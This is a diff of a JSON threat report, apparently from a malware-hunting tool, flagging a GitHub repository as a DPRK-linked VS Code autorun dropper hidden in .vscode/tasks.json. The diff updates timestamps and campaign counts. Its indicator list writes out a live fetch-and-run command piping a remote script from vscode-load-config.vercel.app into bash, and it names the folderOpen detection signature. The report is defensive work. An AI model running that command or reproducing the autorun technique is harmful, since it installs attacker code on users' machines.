@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 19)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/eastmade_web3project-momo-token.json",
     "reviewer_decision": "",
     "notes": ""
@@ -118,7 +118,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/eastmade/web3project-momo-token",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-load-config.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-load-config.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-load-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-load-config.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-load-config.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-load-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-load-config.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-load-config.vercel.app",
     "publisher": "eastmade",
     "severity_level": "critical",
@@ -136,7 +136,7 @@
     "evidence_references": "https://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/.vscode/tasks.json\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/release-cycle.yml#L33\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/release-cycle.yml#L65\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/release-cycle.yml#L118\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/release-cycle.yml#L140\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/release-cycle.yml#L153\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/release-cycle.yml#L172\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/.github/workflows/formal-verification.yml#L37\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/scripts/generate/run.js#L3\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/lib/openzeppelin-contracts/lib/forge-std/scripts/vm.py#L93\nhttps://github.com/eastmade/web3project-momo-token/blob/edb74100205214749a2c90daedd822d4f40e5ca2/backend/src/utils/redis.js#L27",
     "verified_iocs": "vscode-load-config.vercel.app\nhttps://vscode-load-config.vercel.app/settings/mac?flag=4\nhttps://vscode-load-config.vercel.app/settings/linux?flag=4\ncurl 'https://vscode-load-config.vercel.app/settings/mac?flag=4' | bash\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
